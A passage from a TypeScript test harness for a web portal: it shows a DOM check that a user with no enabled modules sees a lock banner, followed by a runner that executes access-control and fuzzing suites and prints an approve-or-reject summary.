    const hasNoModulesBanner = html.includes('Nenhum Módulo Corporativo Habilitado');

    await prisma.session.deleteMany({ where: { userId: zeroUser.id } });
    await prisma.user.delete({ where: { id: zeroUser.id } });

    const passed = !hasOrcamentoLink && !hasMedicaoLink && hasNoModulesBanner;
    recordTest({
      suite: 'DOM Integrity',
      testId: 'DOM-PERM-ZERO',
      name: 'Zero modules user renders lock banner and both cards disabled',
      passed,
      durationMs: performance.now() - start,
      details: passed
        ? undefined
        : `Flags: orcLink=${hasOrcamentoLink}, medLink=${hasMedicaoLink}, banner=${hasNoModulesBanner}`,
    });
  }
}

// =========================================================================
// MAIN RUNNER
// =========================================================================

async function main() {
  const globalStart = performance.now();
  console.log('###############################################################');
  console.log('  CHALLENGER M2-1: ROOT REDIRECTION & PARAMETER FUZZING');
  console.log('###############################################################');

  try {
    await runRootTriageSuite();
    await runPortalFuzzingSuite();
    await runDomIntegritySuite();
  } catch (err: any) {
    console.error('CRITICAL UNHANDLED ERROR IN HARNESS:', err);
    process.exit(1);
  }

  const globalDuration = (performance.now() - globalStart).toFixed(2);
  const total = results.length;
  const passed = results.filter((r) => r.passed).length;
  const failed = results.filter((r) => !r.passed).length;

  console.log('\n===============================================================');
  console.log('  FINAL SUMMARY: CHALLENGER M2-1 EMPIRICAL RESULTS');
  console.log('===============================================================');
  console.log(`Total Challenges Executed:  ${total}`);
  console.log(`Passed / Blocked:          ${passed} (${((passed / total) * 100).toFixed(1)}%)`);
  console.log(`Failed / Vulnerabilities:   ${failed}`);
  console.log(`Execution Time:            ${globalDuration}ms`);
  console.log('===============================================================');

  if (failed > 0) {
    console.error(`\n❌ VERDICT: REJECT (${failed} test(s) failed)`);
    process.exit(1);
  } else {
    console.log(`\n✅ VERDICT: APPROVE (100% of adversarial challenges passed)`);
    process.exit(0);
  }
}

main().catch((e) => {
  console.error('Fatal execution error:', e);
  process.exit(1);
});
